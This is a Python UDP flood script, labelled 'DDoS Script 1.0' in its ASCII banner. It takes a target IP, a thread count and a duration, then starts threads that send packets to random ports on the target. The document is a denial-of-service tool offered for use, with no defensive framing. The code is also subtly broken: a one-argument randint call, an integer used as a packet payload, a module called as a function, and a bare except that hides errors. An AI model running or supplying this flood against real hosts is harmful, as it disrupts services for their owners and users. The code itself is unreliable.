from colorama import Fore, Back, Style
import socket
import random
import threading
import sys
import clear
import time

from colorama import init

init(autoreset=True)

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print(Back.RED + "\n[+] Command Usage: Python " + sys.argv[0] + " <IP> <Packets> <Time>")
    sys.exit()

timeout = time.time() + 1 * timer


def attack():
    try:
        bytes = random.randint(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20, 55500)
            sock.sendto(bytes * random.randint(5, 15), (target, dport))
        return
        sys.exit()

    except:
        pass


clear()

print(
    Back.MAGENTA + "------------------------------------------------------------------------------------------------------------------------")
print(Back.RED + (f"\nSending Attack to {target} with {threads} packets for {timer} seconds"))
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(Fore.RED + """
          -=================================================================================================- 
         -=-                                                                                               -=-
        -==-                    db .d8888. d888888b d8888b. d8888b. .88b  d88. d8888b. db    db            -==-
       -===-                   o88 88'  YP `~~88~~' 88  `8D VP  `8D 88'YbdP`88 88  `8D `8b  d8'            -===-
      -====-                    88 `8bo.      88    88oobY'   oooY' 88  88  88 88oodD'  `8bd8'             -====-
      -====-                    88   `Y8b.    88    88`8b     ~~~b. 88  88  88 88~~~      88               -====-
       -===-                    88 db   8D    88    88 `88. db   8D 88  88  88 88         88               -===-
        -==-                    VP `8888Y'    YP    88   YD Y8888P' YP  YP  YP 88         YP               -==-
         -=-                                                                                               -=-
          -=================================================================================================-

                                                |═════════════════════|                                
                                                |   DDoS Script 1.0   |
                                                |═════════════════════|
    """)
print(" ")
print(" ")
print(" ")
print(" ")
print(
    Back.MAGENTA + "------------------------------------------------------------------------------------------------------------------------")
for x in range(0, threads):
    threading.Thread(target=attack).start()